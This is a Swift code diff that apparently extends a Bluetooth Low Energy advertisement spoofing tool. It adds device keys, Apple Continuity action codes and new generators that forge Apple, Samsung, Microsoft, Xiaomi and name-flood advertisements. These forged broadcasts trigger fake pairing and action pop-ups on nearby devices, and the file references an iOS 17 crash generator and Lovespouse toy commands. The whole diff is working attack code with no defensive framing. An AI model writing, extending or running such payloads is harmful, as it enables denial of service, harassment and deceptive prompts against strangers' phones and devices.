@@ -5,6 +5,7 @@ let MANUFACTURER_APPLE: UInt16 = 0x004C
 let MANUFACTURER_MICROSOFT: UInt16 = 0x0006
 let MANUFACTURER_SAMSUNG: UInt16 = 0x0075
 let MANUFACTURER_TYPO: UInt16 = 0x00FF
+let MANUFACTURER_XIAOMI: UInt16 = 0x038F
 
 let UUID_GOOGLE_FAST_PAIR = "0000FE2C-0000-1000-8000-00805F9B34FB"
 
@@ -58,6 +59,14 @@ let appleDevices: [DeviceInfo] = [
     DeviceInfo(name: "Beats Studio Pro", key: "1720"),
     DeviceInfo(name: "Beats Fit Pro", key: "1220"),
     DeviceInfo(name: "Beats Studio Buds+", key: "1620"),
+    DeviceInfo(name: "AirPods Pro 2nd Gen USB-C", key: "2420"),
+    DeviceInfo(name: "AirPods 4 ANC", key: "2820"),
+    DeviceInfo(name: "AirPods 4", key: "2920"),
+    DeviceInfo(name: "AirPods Max USB-C", key: "2B20"),
+    DeviceInfo(name: "Beats Powerbeats Pro 2", key: "2C20"),
+    DeviceInfo(name: "Beats Solo 4", key: "2520"),
+    DeviceInfo(name: "Beats Solo Buds", key: "2620"),
+    DeviceInfo(name: "Powerbeats Fit", key: "2F20"),
 ]
 
 // Matches ContinuityActionModalAdvertisementSetGenerator.kt _nearbyActions
@@ -83,6 +92,23 @@ let appleActionModals: [ActionModal] = [
     ActionModal(name: "Apple Vision Pro", code: "24"),
     ActionModal(name: "Connect to other Device", code: "2F"),
     ActionModal(name: "Software Update", code: "21"),
+    ActionModal(name: "Mobile Backup", code: "04"),
+    ActionModal(name: "Internet Relay", code: "07"),
+    ActionModal(name: "WiFi Password", code: "08"),
+    ActionModal(name: "Repair", code: "0A"),
+    ActionModal(name: "Apple Pay", code: "0C"),
+    ActionModal(name: "Developer Tools Pairing", code: "0E"),
+    ActionModal(name: "Answered Call", code: "0F"),
+    ActionModal(name: "Ended Call", code: "10"),
+    ActionModal(name: "DD Ping", code: "11"),
+    ActionModal(name: "DD Pong", code: "12"),
+    ActionModal(name: "Companion Link Proximity", code: "14"),
+    ActionModal(name: "Remote Management", code: "15"),
+    ActionModal(name: "Remote Auto Fill Pong", code: "16"),
+    ActionModal(name: "Remote Display", code: "17"),
+    ActionModal(name: "Unlock with Apple Watch", code: "2E"),
+    ActionModal(name: "AirDrop Sidecar", code: "25"),
+    ActionModal(name: "Vision Pro Setup", code: "2C"),
 ]
 
 // Matches ContinuityIos17CrashAdvertisementSetGenerator.kt _nearbyActions
@@ -300,6 +326,22 @@ let samsungWatches: [DeviceInfo] = [
     DeviceInfo(name: "Silver Watch6 Cyan 44mm", key: "1D"),
     DeviceInfo(name: "Black Watch6 Classic 43m", key: "1E"),
     DeviceInfo(name: "Green Watch6 Classic 43m", key: "20"),
+    DeviceInfo(name: "Black Watch5 Golf Edition", key: "E4"),
+    DeviceInfo(name: "White Watch5 Gold Edition", key: "E5"),
+    DeviceInfo(name: "Black Watch6 Golf Edition", key: "EC"),
+    DeviceInfo(name: "Black Watch6 TB Edition", key: "EF"),
+    DeviceInfo(name: "Black Galaxy Watch7 44mm", key: "30"),
+    DeviceInfo(name: "Green Galaxy Watch7 44mm", key: "31"),
+    DeviceInfo(name: "Cream Galaxy Watch7 40mm", key: "32"),
+    DeviceInfo(name: "Green Galaxy Watch7 40mm", key: "33"),
+    DeviceInfo(name: "White Galaxy Watch7 Classic", key: "34"),
+    DeviceInfo(name: "Black Galaxy Watch7 Classic", key: "35"),
+    DeviceInfo(name: "Titanium White Watch Ultra", key: "40"),
+    DeviceInfo(name: "Titanium Black Watch Ultra", key: "41"),
+    DeviceInfo(name: "Titanium Silver Watch Ultra", key: "42"),
+    DeviceInfo(name: "Black Galaxy Ring", key: "60"),
+    DeviceInfo(name: "Gold Galaxy Ring", key: "61"),
+    DeviceInfo(name: "Silver Galaxy Ring", key: "62"),
 ]
 
 // MARK: - Lovespouse
@@ -358,6 +400,14 @@ enum PayloadType: String, CaseIterable {
     case samsungWatch = "Samsung Watch"
     case lovespousePlay = "Lovespouse Play"
     case lovespouseStop = "Lovespouse Stop"
+    case xiaomiQuickConnect = "Xiaomi QuickConnect"
+    case appleAirdrop = "Apple AirDrop"
+    case appleAirplayTarget = "Apple AirPlay Target"
+    case appleHandoff = "Apple Handoff"
+    case appleTetheringSource = "Apple Tethering Source"
+    case appleNearbyInfo = "Apple Nearby Info"
+    case microsoftSwiftPairHeadphone = "Microsoft Swift Pair Headphone"
+    case nameflood = "Name Flood"
 }
 
 struct BLEPayload {
@@ -489,6 +539,64 @@ func generatePayload(_ type: PayloadType) -> BLEPayload {
         payload.append(contentsOf: hexToBytes("03038FAE"))
         return BLEPayload(type: type, manufacturerId: MANUFACTURER_TYPO,
                           manufacturerData: Data(payload),
+                          serviceUUID: nil, serviceData: nil)
+
+    case .xiaomiQuickConnect:
+        var payload = hexToBytes("160120")
+        payload.append(contentsOf: randomBytes(2))
+        payload.append(contentsOf: hexToBytes("170A00000000885011B1FF"))
+        payload.append(contentsOf: randomBytes(2))
+        payload.append(contentsOf: hexToBytes("000000000000"))
+        return BLEPayload(type: type, manufacturerId: MANUFACTURER_XIAOMI,
+                          manufacturerData: Data(payload),
+                          serviceUUID: nil, serviceData: nil)
+
+    case .appleAirdrop:
+        var hex = "0512" + String(repeating: "00", count: 8)
+        hex += String(format: "%02x", Int.random(in: 0...255))
+        hex += randomHex(2) + randomHex(2) + randomHex(4) + "00"
+        return BLEPayload(type: type, manufacturerId: MANUFACTURER_APPLE,
+                          manufacturerData: Data(hexToBytes(hex)),
+                          serviceUUID: nil, serviceData: nil)
+
+    case .appleAirplayTarget:
+        let hex = "0906" + randomHex(6)
+        return BLEPayload(type: type, manufacturerId: MANUFACTURER_APPLE,
+                          manufacturerData: Data(hexToBytes(hex)),
+                          serviceUUID: nil, serviceData: nil)
+
+    case .appleHandoff:
+        let hex = "0C0E" + randomHex(14)
+        return BLEPayload(type: type, manufacturerId: MANUFACTURER_APPLE,
+                          manufacturerData: Data(hexToBytes(hex)),
+                          serviceUUID: nil, serviceData: nil)
+
+    case .appleTetheringSource:
+        let hex = "0E06" + randomHex(6)
+        return BLEPayload(type: type, manufacturerId: MANUFACTURER_APPLE,
+                          manufacturerData: Data(hexToBytes(hex)),
+                          serviceUUID: nil, serviceData: nil)
+
+    case .appleNearbyInfo:
+        let hex = "1005" + randomHex(5)
+        return BLEPayload(type: type, manufacturerId: MANUFACTURER_APPLE,
+                          manufacturerData: Data(hexToBytes(hex)),
+                          serviceUUID: nil, serviceData: nil)
+
+    case .microsoftSwiftPairHeadphone:
+        let name = swiftPairNames.randomElement()!
+        var data = hexToBytes("030180D72FD2F461E4040400")
+        data.append(contentsOf: Array(name.utf8))
+        return BLEPayload(type: type, manufacturerId: MANUFACTURER_MICROSOFT,
+                          manufacturerData: Data(data),
+                          serviceUUID: nil, serviceData: nil)
+
+    case .nameflood:
+        let names = ["Free WiFi", "AirDrop", "Keyboard", "Mouse", "TV Remote",
+                     "Game Controller", "Headphones", "Speaker", "Webcam", "Printer"]
+        let name = names.randomElement()!
+        return BLEPayload(type: type, manufacturerId: nil,
+                          manufacturerData: Data(Array(name.utf8)),
                           serviceUUID: nil, serviceData: nil)
     }
 }
